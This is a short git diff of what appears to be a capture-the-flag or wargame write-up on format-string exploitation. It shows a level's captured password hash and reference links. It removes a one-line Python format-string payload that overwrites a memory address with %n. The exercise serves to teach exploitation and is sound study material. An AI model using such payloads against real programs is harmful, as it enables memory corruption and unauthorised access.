@@ -139,8 +139,6 @@ cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
-echo $(python -c "print( 'AAAAAAAAAAA0' + '\x8c\x98\x04\x08' + '%x' * 6 + 'aaaaa%n')") > /tmp/payload
-
 ## Important doc
 
 [Video + short explanation for FSV](https://www.reddit.com/r/C_Programming/comments/18wtu9a/fgets_is_unsafe_so_whats_the_alternative/)
@@ -152,5 +150,3 @@ echo $(python -c "print( 'AAAAAAAAAAA0' + '\x8c\x98\x04\x08' + '%x' * 6 + 'aaaaa
 [Memory protection and bypasses](https://mdanilor.github.io/posts/memory-protections/)
 
 [Checksec explained](https://medium.com/@slimm609/checksec-d4131dff0fca)
-
-[Overwrite BSS memory values](https://medium.com/zh3r0/intro-to-pwn-protostar-format-strings-c86ca3458ad3)
